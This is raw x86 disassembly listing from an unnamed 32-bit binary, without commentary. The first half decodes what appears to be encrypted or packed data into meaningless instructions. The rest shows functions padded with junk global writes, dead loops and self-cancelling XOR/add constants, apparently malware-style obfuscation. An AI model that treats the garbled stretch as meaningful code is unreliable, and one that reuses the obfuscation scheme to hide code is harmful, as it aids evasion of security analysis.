  40cd6b:	(bad)  
  40cd6d:	cmc    
  40cd6e:	hlt    
  40cd6f:	retf   0xf4e6
  40cd72:	out    dx,eax
  40cd73:	add    eax,0xefbfd8ca
  40cd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd79:	lock shl dl,1
  40cd7c:	jmp    0xf4fc:0xc6b1edba
  40cd83:	rcl    edi,cl
  40cd85:	aam    0xe2
  40cd87:	mov    ch,0xe3
  40cd89:	mov    ebp,0xde03d006
  40cd8e:	rol    dh,0xd4
  40cd91:	or     al,0xc6
  40cd93:	adc    edi,ebp
  40cd95:	leave  
  40cd96:	mov    esi,0xe4d6e5e6
  40cd9b:	loop   0x40cd66
  40cd9d:	xlat   BYTE PTR ds:[ebx]
  40cd9e:	(bad)  
  40cda0:	lods   al,BYTE PTR ds:[esi]
  40cda1:	mov    ah,0xf5
  40cda3:	ret    
  40cda4:	enter  0xcdbe,0xce
  40cda8:	out    0x2,al
  40cdaa:	repz dec DWORD PTR [ebx]
  40cdad:	clc    
  40cdae:	cld    
  40cdaf:	or     ah,cl
  40cdb1:	out    0xd9,eax
  40cdb3:	fsub   st,st(3)
  40cdb5:	retf   
  40cdb6:	mov    esp,0xced1e4cd
  40cdbb:	retf   
  40cdbc:	imul   cl
  40cdbe:	iret   
  40cdbf:	retf   0xc5ff
  40cdc2:	mov    dl,0xef
  40cdc4:	(bad)  
  40cdc5:	iret   
  40cdc6:	out    dx,eax
  40cdc7:	cli    
  40cdc8:	lock (bad) 
  40cdca:	xlat   BYTE PTR ds:[ebx]
  40cdcb:	(bad)  
  40cdcc:	fiadd  DWORD PTR [esi]
  40cdce:	out    0xc0,al
  40cdd0:	add    bh,bh
  40cdd2:	fstp   st(7)
  40cdd4:	icebp  
  40cdd5:	loop   0x40cd7f
  40cdd7:	call   0xb422aa88
  40cddc:	jmp    0xee11a9b4
  40cde1:	sar    BYTE PTR [edx-0x3e0f3542],cl
  40cde7:	sti    
  40cde8:	cmc    
  40cde9:	inc    ebp
  40cdeb:	retf   
  40cdec:	rcl    ah,cl
  40cdee:	push   es
  40cdef:	hlt    
  40cdf0:	fxch   st(5)
  40cdf2:	in     eax,0xd3
  40cdf4:	or     edx,eax
  40cdf6:	retf   0xbde3
  40cdf9:	retf   0xe1ce
  40cdfc:	shl    ch,0xcc
  40cdff:	int    0xd0
  40ce01:	sti    
  40ce02:	fcomp  st(5)
  40ce04:	cmc    
  40ce05:	loop   0x40cdea
  40ce07:	ret    0xd4f8
  40ce0a:	in     al,0xd1
  40ce0c:	neg    ah
  40ce0e:	(bad)  
  40ce10:	fild   DWORD PTR [eax]
  40ce12:	add    bh,cl
  40ce14:	icebp  
  40ce15:	fmul   st(0),st
  40ce17:	mov    ebp,0xc3c2dceb
  40ce1c:	in     eax,0xda
  40ce1e:	fucomip st,st(1)
  40ce20:	aam    0xd9
  40ce22:	dec    edx
  40ce24:	std    
  40ce25:	add    eax,ecx
  40ce27:	idiv   DWORD PTR [esi-0x2dfe0424]
  40ce2d:	mov    edi,0xfdf5fcdb
  40ce32:	leave  
  40ce33:	std    
  40ce34:	pxor   mm3,mm6
  40ce37:	in     al,dx
  40ce38:	fucomp st(6)
  40ce3a:	hlt    
  40ce3b:	ret    0xebe7
  40ce3e:	stc    
  40ce3f:	aam    0xcd
  40ce41:	repnz hlt 
  40ce43:	clc    
  40ce44:	(bad)  
  40ce46:	into   
  40ce47:	fcomi  st,st(2)
  40ce49:	mov    edi,0xc7c6eafe
  40ce4e:	sar    dl,0xe5
  40ce51:	aam    0xcf
  40ce53:	(bad)  
  40ce54:	(bad)  
  40ce55:	scas   al,BYTE PTR es:[edi]
  40ce56:	(bad)
  40ce59:	mov    cl,0xad
  40ce5b:	test   eax,0xadb6cfeb
  40ce60:	int3   
  40ce61:	in     eax,dx
  40ce62:	jecxz  0x40ce51
  40ce64:	cli    
  40ce65:	rcr    ecx,cl
  40ce67:	rcr    ah,cl
  40ce69:	out    0xf8,eax
  40ce6b:	lock add edi,edi
  40ce6e:	jmp    0xfe2f953b
  40ce73:	repz loop 0x40ce21
  40ce76:	enter  0xb0c8,0xca
  40ce7a:	scas   al,BYTE PTR es:[edi]
  40ce7b:	retf   0xbad6
  40ce7e:	mov    ebx,0xedd3ffb7
  40ce83:	mov    ch,0xd4
  40ce85:	mov    bh,0xd3
  40ce87:	xlat   BYTE PTR ds:[ebx]
  40ce88:	aad    0x2
  40ce8a:	inc    esp
  40ce8c:	fadd   st,st(3)
  40ce8e:	jecxz  0x40ce54
  40ce90:	fimul  DWORD PTR [esp+edx*8]
  40ce93:	jmp    0x40ce8e
  40ce95:	out    0xb8,eax
  40ce97:	in     al,0xa8
  40ce99:	fsubr  st(5),st
  40ce9b:	jmp    0xc5d3:0xd6d4afe6
  40cea2:	out    dx,al
  40cea3:	retf   
  40cea4:	mov    esi,0xb401b8c8
  40cea9:	sar    BYTE PTR [ebp+0x4c3d0f5],1
  40ceaf:	cld    
  40ceb0:	out    0xee,eax
  40ceb2:	pop    es
  40ceb3:	or     al,BYTE PTR [ecx]
  40ceb5:	fcom   st(3)
  40ceb7:	icebp  
  40ceb8:	out    0xce,eax
  40ceba:	jmp    0xf3f9:0xbbf5cbc1
  40cec1:	jmp    0xe0fb:0xf4f9eed5
  40cec8:	loope  0x40cebb
  40ceca:	add    eax,0xdae7c4c4
  40cecf:	cld    
  40ced0:	add    eax,0xdaebfade
  40ced5:	fbstp  TBYTE PTR [ecx-0x3243100e]
  40cedb:	lods   eax,DWORD PTR ds:[esi]
  40cedc:	retf   
  40cedd:	loope  0x40ceb5
  40cedf:	mov    cl,0xe9
  40cee1:	test   cl,0xf1
  40cee4:	(bad)  
  40cee6:	(bad)  
  40cee7:	std    
  40cee8:	(bad)  
  40ceea:	cld    
  40ceeb:	jmp    0x40cef6
  40ceed:	loop   0x40ceaf
  40ceef:	mov    ebp,0x705c6e5
  40cef4:	fmul   st(2),st
  40cef6:	out    0xd0,eax
  40cef8:	div    bh
  40cefa:	(bad)  
  40cefb:	out    dx,al
  40cefc:	mov    al,0xaf
  40cefe:	int    0xd8
  40cf00:	lods   al,BYTE PTR ds:[esi]
  40cf01:	mov    ebp,0xd5cffcf7
  40cf06:	loopne 0x40cee5
  40cf08:	out    0xf3,eax
  40cf0a:	rcr    esi,1
  40cf0c:	call   esp
  40cf0e:	sti    
  40cf0f:	hlt    
  40cf10:	out    0xef,al
  40cf12:	int3   
  40cf13:	loope  0x40cef5
  40cf15:	retf   0xb3ac
  40cf18:	in     eax,dx
  40cf19:	div    dl
  40cf1b:	test   eax,0xfafaf1d4
  40cf20:	mov    bh,0xfe
  40cf22:	retf   0xffe9
  40cf25:	jmp    0xd0f5c4f8
  40cf2a:	loopne 0x40cf04
  40cf2c:	out    0xc3,al
  40cf2e:	fadd   DWORD PTR [eax]
  40cf30:	add    ecx,esp
  40cf32:	jmp    0x40cf1c
  40cf34:	or     BYTE PTR [ecx-0x351e411a],bh
  40cf3a:	mul    esp
  40cf3c:	call   0xe9fbb939
  40cf41:	(bad)  
  40cf43:	mov    ebp,0xbddac8ff
  40cf48:	in     eax,0xfb
  40cf4a:	loop   0x40cf41
  40cf4c:	jmp    0xe8e8:0x2090adf
  40cf53:	(bad)  
  40cf55:	fnstenv [eax-0x552c4e2f]
  40cf5b:	repnz jmp 0xc8f6:0xf5b1dfc5
  40cf63:	ret    
  40cf64:	clc    
  40cf65:	rol    ecx,cl
  40cf67:	fucom  st(5)
  40cf69:	(bad)  
  40cf6a:	ret    
  40cf6b:	fdiv   st,st(2)
  40cf6d:	aam    0xd0
  40cf6f:	or     ecx,esi
  40cf71:	enter  0x2ce,0xe5
  40cf75:	enter  0xe8e5,0xc3
  40cf79:	mov    dl,0xf2
  40cf7b:	sti    
  40cf7c:	fyl2x  
  40cf7e:	mov    ecx,0xc4dbfaf7
  40cf83:	in     al,dx
  40cf84:	(bad)  
  40cf86:	shr    ah,cl
  40cf88:	fucom  st(4)
  40cf8a:	rcl    eax,0xd0
  40cf8d:	(bad)  
  40cf8e:	cld    
  40cf8f:	sti    
  40cf90:	loope  0x40cf6f
  40cf92:	fucomi st,st(1)
  40cf94:	retf   0xe9f3
  40cf97:	out    0xd0,al
  40cf99:	(bad)  
  40cf9a:	hlt    
  40cf9b:	sti    
  40cf9c:	iret   
  40cf9d:	xlat   BYTE PTR ds:[ebx]
  40cf9e:	jmp    0xee34a570
  40cfa3:	fcmovne st,st(5)
  40cfa5:	repnz out dx,al
  40cfa7:	fdiv   st(4),st
  40cfa9:	int3   
  40cfaa:	pop    es
  40cfab:	not    al
  40cfad:	or     dl,bh
  40cfaf:	(bad)  
  40cfb0:	in     eax,0xd5
  40cfb2:	add    ecx,ecx
  40cfb4:	out    0xa7,eax
  40cfb6:	repnz mov cl,0xec
  40cfb9:	aam    0xca
  40cfbb:	ret    0xc1fa
  40cfbe:	mov    al,0xda
  40cfc0:	icebp  
  40cfc1:	call   0xca3cd2a9
  40cfc6:	fmulp  st(4),st
  40cfc8:	push   es
  40cfc9:	ret    
  40cfca:	fdiv   st,st(3)
  40cfcc:	(bad)  
  40cfcd:	(bad)  
  40cfcf:	loopne 0x40cfa9
  40cfd1:	dec    DWORD PTR [ebx]
  40cfd3:	pandn  mm5,mm4
  40cfd6:	mov    edi,0xcac1bef0
  40cfdb:	jmp    0xd2c8:0xfee8e1d2
  40cfe2:	std    
  40cfe3:	out    dx,al
  40cfe4:	sar    DWORD PTR [ecx-0x843ff04],1
  40cfea:	mov    esi,0x4c9fff7
  40cfef:	loope  0x40cff8
  40cff1:	out    0x2,al
  40cff3:	or     dl,ah
  40cff5:	loope  0x40cfbd
  40cff7:	shr    ebp,0xe3
  40cffa:	mov    al,0xc4
  40cffc:	out    dx,eax
  40cffd:	shl    DWORD PTR [edx-0x2a01362e],0xca
  40d004:	jmp    0x124acc7
  40d009:	mov    edi,0xe9c0dec4
  40d00e:	pop    es
  40d00f:	loope  0x40cff0
  40d011:	jmp    0xa9ca:0xbccfdbe0
  40d018:	rcr    ch,1
  40d01a:	aad    0xd4
  40d01c:	fcmovnbe st,st(3)
  40d01e:	rol    ebp,1
  40d020:	mov    al,0xcd
  40d022:	(bad)  
  40d023:	(bad)  
  40d024:	cld    
  40d025:	jmp    0xe241bc31
  40d02a:	ret    
  40d02b:	aam    0xf2
  40d02d:	lock jmp esp
  40d030:	add    al,0xc7
  40d032:	fdiv   st(0),st
  40d034:	or     dl,dl
  40d036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d037:	in     eax,0xc3
  40d039:	mov    dl,0xc1
  40d03b:	in     eax,dx
  40d03c:	imul   eax
  40d03e:	int3   
  40d03f:	(bad)  
  40d040:	mov    esi,0xeff3d6c8
  40d045:	in     al,dx
  40d046:	aad    0xcf
  40d048:	shl    ebx,cl
  40d04a:	add    esi,esi
  40d04c:	fadd   DWORD PTR [esi]
  40d04e:	(bad)  
  40d04f:	in     al,0x7
  40d051:	fild   DWORD PTR [eax]
  40d053:	adc    bl,bh
  40d055:	in     al,0xc7
  40d057:	int    0xc1
  40d059:	fsubr  QWORD PTR [ebp-0x474b340e]
  40d05f:	imul   eax
  40d061:	(bad)
  40d064:	(bad)  
  40d065:	mov    esp,0xd900cfcf
  40d06a:	mov    edx,0xe7c4d8fd
  40d06f:	cmc    
  40d070:	loop   0x40d075
  40d072:	repz push es
  40d074:	add    ebp,ebx
  40d076:	mov    dl,0xae
  40d078:	rol    al,cl
  40d07a:	retf   0xe4cb
  40d07d:	aad    0xc7
  40d07f:	mov    bh,0xef
  40d081:	repnz out dx,al
  40d083:	mov    cl,0xc2
  40d085:	int    0xff
  40d087:	out    dx,eax
  40d088:	add    eax,0xc4e3f6fe
  40d08d:	test   BYTE PTR [edi],0xe3
  40d090:	sti    
  40d091:	pop    es
  40d092:	(bad)  
  40d093:	in     al,0x9
  40d095:	ffreep st(0)
  40d097:	call   0xe83ca579
  40d09c:	ret    0xb9d1
  40d09f:	in     eax,dx
  40d0a0:	jmp    0xccbd:0xffd6d3ba
  40d0a7:	add    DWORD PTR [ebx],eax
  40d0a9:	cmc    
  40d0aa:	add    bl,dh
  40d0ac:	cld    
  40d0ad:	mov    edi,0xcdc50e0f
  40d0b2:	retf   0xe3fe
  40d0b5:	fld1   
  40d0b7:	ret    
  40d0b8:	rol    ebx,cl
  40d0ba:	out    0xf4,eax
  40d0bc:	shl    esi,0xb6
  40d0bf:	mov    ah,0xc6
  40d0c1:	mov    bh,0xb9
  40d0c3:	lock mov edx,0xddbfd1ed
  40d0c9:	clc    
  40d0ca:	fcom   st(7)
  40d0cc:	vpmaddwd xmm0,xmm5,XMMWORD PTR ds:0xed0be5f4
  40d0d4:	shr    al,0xc0
  40d0d7:	lds    ebp,FWORD PTR [ebp-0x2c324a20]
  40d0dd:	aad    0xea
  40d0df:	out    dx,eax
  40d0e0:	cmc    
  40d0e1:	imul   dh
  40d0e3:	(bad)  
  40d0e4:	into   
  40d0e5:	out    dx,al
  40d0e6:	shl    edx,1
  40d0e8:	(bad)  
  40d0ea:	test   BYTE PTR [ebx],0xdf
  40d0ed:	aam    0xf
  40d0ef:	jecxz  0x40d0e0
  40d0f1:	or     DWORD PTR [esi],eax
  40d0f3:	movups xmm5,xmm4
  40d0f6:	jmp    0xd510a7aa
  40d0fb:	out    0xfb,al
  40d0fd:	sti    
  40d0fe:	(bad)  
  40d0ff:	sar    eax,1
  40d101:	mov    dh,0xdf
  40d103:	(bad)  
  40d104:	fstp   TBYTE PTR [ebx-0x1b472048]
  40d10a:	in     al,dx
  40d10b:	icebp  
  40d10c:	out    0xdc,al
  40d10e:	(bad)  
  40d10f:	(bad)  
  40d111:	fucom  st(5)
  40d113:	(bad)  [eax]
  40d115:	(bad)  
  40d116:	rcl    dl,cl
  40d118:	retf   
  40d119:	mov    dl,0xf3
  40d11b:	fucomi st,st(1)
  40d11d:	in     al,0xe6
  40d11f:	clc    
  40d120:	mov    ch,0xcc
  40d122:	jmp    0x40d0ec
  40d124:	ret    0xdcce
  40d127:	ret    0xccd3
  40d12a:	aad    0xfe
  40d12c:	idiv   al
  40d12e:	push   es
  40d12f:	xlat   BYTE PTR ds:[ebx]
  40d130:	retf   
  40d131:	(bad)
  40d134:	cli    
  40d135:	mov    esi,0xf4ecbef7
  40d13a:	ror    dh,cl
  40d13c:	out    0xd2,eax
  40d13e:	mov    dh,0xe4
  40d140:	fldl2t 
  40d142:	fdivrp st(2),st
  40d144:	fsincos 
  40d146:	(bad)  
  40d147:	xlat   BYTE PTR ds:[ebx]
  40d148:	in     al,dx
  40d149:	rol    DWORD PTR [ecx],cl
  40d14b:	add    bh,ah
  40d14d:	fsubrp st(4),st
  40d14f:	or     al,ch
  40d151:	inc    DWORD PTR [edx]
  40d153:	in     eax,dx
  40d154:	pop    es
  40d155:	retf   
  40d156:	retf   
  40d157:	in     eax,0xcf
  40d159:	test   bl,0xf1
  40d15c:	lods   al,BYTE PTR ds:[esi]
  40d15d:	mov    ah,0xfb
  40d15f:	retf   0xeed7
  40d162:	mov    dh,0xee
  40d164:	retf   0xd7f1
  40d167:	std    
  40d168:	fnstsw WORD PTR [edi-0x3e012d0b]
  40d16e:	(bad)  
  40d16f:	out    0xff,al
  40d171:	(bad)  
  40d173:	loope  0x40d14f
  40d175:	mov    cl,0xd2
  40d177:	ror    esp,1
  40d179:	int    0xc9
  40d17b:	icebp  
  40d17c:	jmp    0xf7cb:0xe8f6fbd6
  40d183:	mov    esp,0xf900bdf2
  40d188:	clc    
  40d189:	std    
  40d18a:	(bad)  
  40d18b:	aam    0xe5
  40d18d:	fsubrp st(2),st
  40d18f:	cmc    
  40d190:	in     eax,dx
  40d191:	call   0xe12ad09c
  40d196:	(bad)  
  40d197:	int    0xea
  40d199:	icebp  
  40d19a:	in     al,dx
  40d19b:	icebp  
  40d19c:	lods   al,BYTE PTR ds:[esi]
  40d19d:	cli    
  40d19e:	in     eax,0xd7
  40d1a0:	sti    
  40d1a1:	in     al,0x3
  40d1a3:	shl    bl,cl
  40d1a5:	stc    
  40d1a6:	int    0xd0
  40d1a8:	std    
  40d1a9:	fcom   st(5)
  40d1ab:	aad    0xe2
  40d1ad:	or     DWORD PTR [eax],eax
  40d1af:	mov    ebp,0xe0fcc905
  40d1b4:	int3   
  40d1b5:	shr    esi,0xb2
  40d1b8:	(bad)  
  40d1b9:	imul   esi
  40d1bb:	mov    bl,0xc1
  40d1bd:	loope  0x40d171
  40d1bf:	jmp    0xc2b4:0xf5f0e8fe
  40d1c6:	mov    esi,0xbde7fbe3
  40d1cb:	add    dh,cl
  40d1cd:	add    BYTE PTR [ebx],cl
  40d1cf:	out    dx,eax
  40d1d0:	retf   
  40d1d1:	or     esp,edi
  40d1d3:	add    BYTE PTR [ecx],al
  40d1d5:	in     eax,0xcb
  40d1d7:	jmp    0xc4f7:0xa9cacbe3
  40d1de:	jmp    0x40d1d7
  40d1e0:	in     al,dx
  40d1e1:	fmulp  st(2),st
  40d1e3:	(bad)  
  40d1e4:	bnd ret 
  40d1e6:	(bad)  
  40d1e7:	in     eax,dx
  40d1e8:	sar    ch,0xd1
  40d1eb:	jecxz  0x40d1d1
  40d1ed:	jecxz  0x40d1e9
  40d1ef:	out    0xf6,al
  40d1f1:	cld    
  40d1f2:	(bad)  
  40d1f3:	(bad)  
  40d1f4:	(bad)  
  40d1f5:	jmp    0xb0bc:0xc2c3ede5
  40d1fc:	in     al,0xb9
  40d1fe:	clc    
  40d1ff:	neg    dl
  40d201:	in     eax,0xeb
  40d203:	int3   
  40d204:	mov    ebx,0xedc0dfe1
  40d209:	(bad)  
  40d20a:	add    eax,0xae0de0b
  40d20f:	add    ah,bh
  40d211:	or     dl,cl
  40d213:	add    BYTE PTR ds:0xe9cbf0bf,al
  40d219:	iret   
  40d21a:	shl    dl,cl
  40d21c:	shl    esi,0xe4
  40d21f:	aad    0xbf
  40d221:	div    BYTE PTR [ebp-0x1d464027]
  40d227:	mov    eax,0x3705bcf5
  40d22c:	inc    ecx
  40d22d:	inc    edx
  40d22e:	add    eax,0x8b00d183
  40d233:	dec    ebp
  40d234:	cld    
  40d235:	mov    ecx,DWORD PTR [ecx]
  40d237:	xor    ecx,eax
  40d239:	mov    eax,DWORD PTR [ebp-0x4]
  40d23c:	mov    DWORD PTR [eax],ecx
  40d23e:	mov    eax,DWORD PTR [ebp+0x14]
  40d241:	mov    eax,DWORD PTR [eax]
  40d243:	mov    DWORD PTR [ebp-0x38],eax
  40d246:	mov    eax,DWORD PTR [ebp-0x38]
  40d249:	mov    eax,DWORD PTR [eax]
  40d24b:	mov    ecx,DWORD PTR [ebp-0x4]
  40d24e:	mov    ecx,DWORD PTR [ecx]
  40d250:	xor    edx,edx
  40d252:	sub    ecx,0x5424137
  40d258:	sbb    edx,0x0
  40d25b:	xor    ecx,0x8a29a14b
  40d261:	xor    edx,0x0
  40d264:	xor    ecx,0x8a29a14b
  40d26a:	xor    edx,0x0
  40d26d:	add    ecx,0x5424137
  40d273:	adc    edx,0x0
  40d276:	mov    eax,DWORD PTR [eax]
  40d278:	xor    esi,esi
  40d27a:	add    eax,ecx
  40d27c:	adc    esi,edx
  40d27e:	mov    ecx,DWORD PTR [ebp-0x38]
  40d281:	mov    ecx,DWORD PTR [ecx]
  40d283:	mov    DWORD PTR [ecx],eax
  40d285:	mov    eax,DWORD PTR [ebp-0xc]
  40d288:	mov    DWORD PTR [eax],0x70941f81
  40d28e:	mov    DWORD PTR [eax+0x4],0xffffffff
  40d295:	mov    eax,DWORD PTR [ebp-0x18]
  40d298:	mov    ecx,DWORD PTR [ebp-0x14]
  40d29b:	mov    DWORD PTR [ebp-0x40],eax
  40d29e:	mov    DWORD PTR [ebp-0x3c],ecx
  40d2a1:	cmp    DWORD PTR [ebp-0x40],0x70941f81
  40d2a8:	jne    0x40d342
  40d2ae:	cmp    DWORD PTR [ebp-0x3c],0xffffffff
  40d2b2:	jne    0x40d342
  40d2b8:	mov    eax,DWORD PTR [ebp-0x4]
  40d2bb:	mov    eax,DWORD PTR [eax]
  40d2bd:	xor    ecx,ecx
  40d2bf:	sub    eax,0x5424137
  40d2c4:	sbb    ecx,0x0
  40d2c7:	xor    eax,0x8a29a14b
  40d2cc:	xor    ecx,0x0
  40d2cf:	mov    edx,DWORD PTR [ebp+0x8]
  40d2d2:	xor    edx,0x75108b5
  40d2d8:	add    edx,0x3272fb
  40d2de:	xor    esi,esi
  40d2e0:	sub    edx,0x5424137
  40d2e6:	sbb    esi,0x0
  40d2e9:	xor    edx,0x8a29a14b
  40d2ef:	xor    esi,0x0
  40d2f2:	mov    DWORD PTR [ebp-0x48],eax
  40d2f5:	mov    DWORD PTR [ebp-0x44],ecx
  40d2f8:	mov    DWORD PTR [ebp-0x50],edx
  40d2fb:	mov    DWORD PTR [ebp-0x4c],esi
  40d2fe:	mov    eax,DWORD PTR [ebp-0x48]
  40d301:	cmp    eax,DWORD PTR [ebp-0x50]
  40d304:	jne    0x40d342
  40d30a:	mov    eax,DWORD PTR [ebp-0x44]
  40d30d:	cmp    eax,DWORD PTR [ebp-0x4c]
  40d310:	jne    0x40d342
  40d316:	mov    eax,DWORD PTR [ebp-0x4]
  40d319:	mov    eax,DWORD PTR [eax]
  40d31b:	xor    ecx,ecx
  40d31d:	sub    eax,0x5424137
  40d322:	sbb    ecx,0x0
  40d325:	xor    eax,0x8a29a14b
  40d32a:	xor    ecx,0x0
  40d32d:	xor    eax,0x8a29a14b
  40d332:	xor    ecx,0x0
  40d335:	add    eax,0x5424137
  40d33a:	adc    ecx,0x0
  40d33d:	mov    ecx,DWORD PTR [ebp-0x8]
  40d340:	mov    DWORD PTR [ecx],eax
  40d342:	pop    esi
  40d343:	leave  
  40d344:	ret    0x10
  40d347:	push   ebp
  40d348:	mov    ebp,esp
  40d34a:	sub    esp,0x144
  40d350:	sub    DWORD PTR ds:0x437723,0x4cfe
  40d35a:	push   ebx
  40d35b:	or     eax,DWORD PTR ds:0x437783
  40d361:	push   esi
  40d362:	mov    DWORD PTR [ebp-0x3c],0xf89c85b0
  40d369:	or     eax,0x788f
  40d36e:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40d375:	mov    eax,DWORD PTR [ebp-0x3c]
  40d378:	xor    eax,0x75108b5
  40d37d:	mov    DWORD PTR ds:0x437727,0x3e42
  40d387:	add    eax,0x3272fb
  40d38c:	mov    DWORD PTR [ebp-0x28],eax
  40d38f:	cmp    DWORD PTR [ebp+0x14],0x0
  40d393:	mov    DWORD PTR ds:0x4377a3,0x7433
  40d39d:	je     0x40d3c5
  40d3a3:	adc    DWORD PTR ds:0x437743,ebx
  40d3a9:	mov    eax,DWORD PTR [ebp+0x14]
  40d3ac:	adc    DWORD PTR ds:0x437777,0x7bf4
  40d3b6:	mov    eax,DWORD PTR [eax]
  40d3b8:	mov    DWORD PTR ds:0x437753,0x6d3d
  40d3c2:	mov    DWORD PTR [ebp-0x28],eax
  40d3c5:	dec    DWORD PTR ds:0x43775f
  40d3cb:	mov    eax,DWORD PTR [ebp-0x3c]
  40d3ce:	sbb    DWORD PTR ds:0x437783,0x437787
  40d3d8:	xor    eax,0x75108b5
  40d3dd:	adc    DWORD PTR ds:0x437767,0x43775f
  40d3e7:	add    eax,0x3272fb
  40d3ec:	mov    DWORD PTR [ebp-0x2c],eax
  40d3ef:	sub    DWORD PTR ds:0x43774f,edx
  40d3f5:	mov    eax,DWORD PTR [ebp-0x40]
  40d3f8:	or     DWORD PTR ds:0x43778f,0x43774b
  40d402:	xor    eax,0x75108b5
  40d407:	add    DWORD PTR ds:0x43772f,0x43771f
  40d411:	add    eax,0x3272fb
  40d416:	adc    DWORD PTR ds:0x4377a3,0x39ac
  40d420:	mov    DWORD PTR [ebp-0x4],eax
  40d423:	sub    DWORD PTR ds:0x437743,0x27b7
  40d42d:	mov    eax,DWORD PTR [ebp-0x3c]
  40d430:	sbb    DWORD PTR ds:0x4377a7,0x43779f
  40d43a:	xor    eax,0x75108b5
  40d43f:	add    eax,0x3272fb
  40d444:	mov    DWORD PTR [ebp-0x8],eax
  40d447:	movzx  eax,BYTE PTR ds:0x43779b
  40d44e:	xor    DWORD PTR ds:0x437753,eax
  40d454:	mov    eax,DWORD PTR [ebp-0x3c]
  40d457:	xor    eax,0x75108b5
  40d45c:	add    eax,0x3272fb
  40d461:	mov    DWORD PTR ds:0x437723,0x519f
  40d46b:	mov    DWORD PTR [ebp-0x44],eax
  40d46e:	jmp    0x40d503
  40d473:	mov    eax,DWORD PTR [ebp-0x40]
  40d476:	xor    eax,0x75108b5
  40d47b:	mov    DWORD PTR ds:0x437737,0x12
  40d485:	cmp    DWORD PTR ds:0x437737,0x0
  40d48c:	je     0x40d4e4
  40d492:	cmp    DWORD PTR ds:0x437737,0x2
  40d499:	jb     0x40d4e4
  40d49f:	jmp    0x40d4b8
  40d4a4:	push   DWORD PTR [ebp-0x14]
  40d4a7:	push   DWORD PTR [ebp-0x14]
  40d4aa:	push   0x43776f
  40d4af:	push   DWORD PTR [ebp-0x14]
  40d4b2:	call   DWORD PTR ds:0x43c99c
  40d4b8:	cmp    DWORD PTR ds:0x437737,0x3
  40d4bf:	jne    0x40d4d2
  40d4c5:	mov    ecx,DWORD PTR ds:0x437737
  40d4cb:	dec    ecx
  40d4cc:	mov    DWORD PTR ds:0x437737,ecx
  40d4d2:	mov    ecx,DWORD PTR ds:0x437737
  40d4d8:	dec    ecx
  40d4d9:	mov    DWORD PTR ds:0x437737,ecx
  40d4df:	jmp    0x40d485
  40d4e4:	mov    ecx,DWORD PTR [ebp-0x44]
  40d4e7:	lea    eax,[ecx+eax*1+0x3272fb]
  40d4ee:	mov    ecx,DWORD PTR ds:0x43771b
  40d4f4:	sub    ecx,DWORD PTR ds:0x43779f
  40d4fa:	mov    DWORD PTR ds:0x43771b,ecx
  40d500:	mov    DWORD PTR [ebp-0x44],eax
  40d503:	and    DWORD PTR ds:0x4377bb,0x0
  40d50d:	jmp    0x40d521
  40d512:	xor    ecx,ecx
  40d514:	or     ecx,DWORD PTR ds:0x4377bb
  40d51a:	inc    ecx
  40d51b:	mov    DWORD PTR ds:0x4377bb,ecx
  40d521:	cmp    DWORD PTR ds:0x4377bb,0x1b
  40d528:	jae    0x40d57e
  40d52e:	cmp    DWORD PTR ds:0x4377bb,0x9
  40d535:	jb     0x40d57e
  40d53b:	jmp    0x40d55f
  40d540:	push   0x407a
  40d545:	push   0x6d74
  40d54a:	push   0x48da
  40d54f:	push   0x6ac6
  40d554:	push   0x6e05
  40d559:	call   DWORD PTR ds:0x43c9a0
  40d55f:	cmp    DWORD PTR ds:0x4377bb,0x8
  40d566:	jne    0x40d579
  40d56c:	mov    ecx,DWORD PTR ds:0x4377bb
  40d572:	inc    ecx
  40d573:	mov    DWORD PTR ds:0x4377bb,ecx
  40d579:	jmp    0x40d512
  40d57e:	mov    eax,DWORD PTR [ebp-0x44]
  40d581:	and    DWORD PTR ds:0x437777,0x0
  40d58b:	xor    ecx,ecx
  40d58d:	xor    ecx,DWORD PTR ds:0x437777
  40d593:	inc    ecx
  40d594:	mov    DWORD PTR ds:0x437777,ecx
  40d59a:	cmp    DWORD PTR ds:0x437777,0x1b
  40d5a1:	jb     0x40d5c9
  40d5a7:	jmp    0x40d5bc
  40d5ac:	push   0x80b4
  40d5b1:	push   0x2f38
  40d5b6:	call   DWORD PTR ds:0x43c9a4
  40d5bc:	cmp    DWORD PTR ds:0x437777,0x13
  40d5c3:	jb     0x40d58b
  40d5c9:	sub    eax,0x3272fb
  40d5ce:	sbb    DWORD PTR ds:0x43776f,edx
  40d5d4:	xor    eax,0x75108b5
  40d5d9:	sbb    ecx,DWORD PTR ds:0x43775b
  40d5df:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5e2:	sub    ecx,0x3272fb
  40d5e8:	sbb    DWORD PTR ds:0x4377b3,0x1661
  40d5f2:	xor    ecx,0x75108b5
  40d5f8:	mov    DWORD PTR ds:0x437723,0x6ceb
  40d602:	cmp    eax,ecx
  40d604:	mov    DWORD PTR ds:0x43770f,0xe30
  40d60e:	je     0x4125fe
  40d614:	mov    eax,DWORD PTR [ebp-0x3c]
  40d617:	xor    eax,0x75108b5
  40d61c:	add    eax,0x3272fb
  40d621:	cmp    DWORD PTR [ebp-0x44],eax
  40d624:	mov    DWORD PTR ds:0x43778b,0x71e8
  40d62e:	jne    0x40de86
  40d634:	mov    DWORD PTR ds:0x437783,0x16
  40d63e:	cmp    DWORD PTR ds:0x437783,0x0
  40d645:	je     0x40d696
  40d64b:	cmp    DWORD PTR ds:0x437783,0x4
  40d652:	jg     0x40d696
  40d658:	jmp    0x40d66b
  40d65d:	push   0x28fc
  40d662:	push   DWORD PTR [ebp-0x20]
  40d665:	call   DWORD PTR ds:0x43c9a8
  40d66b:	cmp    DWORD PTR ds:0x437783,0x5
  40d672:	jne    0x40d683
  40d678:	mov    eax,ds:0x437783
  40d67d:	dec    eax
  40d67e:	mov    ds:0x437783,eax
  40d683:	xor    eax,eax
  40d685:	xor    eax,DWORD PTR ds:0x437783
  40d68b:	dec    eax
  40d68c:	mov    ds:0x437783,eax
  40d691:	jmp    0x40d63e
  40d696:	mov    eax,DWORD PTR [ebp+0x8]
  40d699:	mov    DWORD PTR [ebp-0x58],eax
  40d69c:	mov    DWORD PTR ds:0x43775f,0x4c77
  40d6a6:	mov    DWORD PTR [ebp-0x50],0xf89c85b0
  40d6ad:	mov    eax,DWORD PTR [ebp-0x58]
  40d6b0:	or     DWORD PTR ds:0x43775b,0x43776f
  40d6ba:	movsx  eax,BYTE PTR [eax]
  40d6bd:	cdq    
  40d6be:	xor    DWORD PTR ds:0x437753,0x4377bb
